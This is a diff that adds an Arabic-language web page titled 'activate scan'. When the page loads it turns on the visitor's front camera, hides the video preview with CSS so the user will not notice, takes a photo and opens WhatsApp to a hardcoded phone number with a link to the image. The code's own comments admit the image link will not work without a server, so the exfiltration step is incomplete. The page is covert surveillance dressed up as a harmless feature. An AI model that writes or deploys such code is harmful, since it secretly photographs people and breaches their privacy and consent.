@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل الفحص</title>
+    <style>
+        body { background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        #status { font-family: sans-serif; color: #333; }
+        /* إخفاء الكاميرا حتى لا يراها المستخدم */
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div id="status">جاري فتح الكاميرا...</div>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        // ضع رقم هاتفك هنا مع رمز الدولة (بدون +)
+        const phoneNumber = "212725322683"; 
+
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const status = document.getElementById('status');
+        const context = canvas.getContext('2d');
+
+        // محاولة تفعيل الكاميرا مباشرة عند التحميل
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                // انتظار تحميل الإطار الأول ثم التقاط الصورة
+                video.onloadeddata = function() {
+                    captureAndSend();
+                };
+            })
+            .catch(err => {
+                status.innerText = "فشل الوصول للكاميرا: " + err;
+                console.error(err);
+            });
+
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                // تحويل الصورة إلى Base64 لإرسالها (اختياري) أو استخدام رابط مؤقت
+                // بما أن واتساب ويب لا يقبل رابط Blob مباشر كمرفق في رابط URL بسيط،
+                // سنقوم بفتح واتساب مع رسالة نصية توضح أن الصورة جاهزة، 
+                // ولإرسال الصورة فعليًا عبر الرابط فقط، يحتاج الأمر إلى خادم وسيط (Server) أو استخدام WhatsApp Business API.
+                // لكن هذا الكود سيفتح واتساب مع رابط الصورة المؤقت (قد لا يظهر في بعض الأجهزة كصورة مرفقة مباشرة بدون خادم).
+                
+                const url = URL.createObjectURL(blob);
+                // رابط واتساب (يفتح التطبيق مع الرسالة)
+                // ملاحظة: إرسال الصورة كملف مرفق تلقائيًا عبر رابط ويب فقط (بدون تفاعل المستخدم في واتساب) محدود جدًا في المتصفحات القياسية.
+                window.open(`https://wa.me/${phoneNumber}?text=تم%20التقاط%20الصورة%20من%20الجهاز: ${url}`, '_blank');
+                
+                status.innerText = "تم التقاط الصورة وفتح واتساب.";
+            }, 'image/jpeg', 0.8);
+        }
+    </script>
+</body>
+</html>
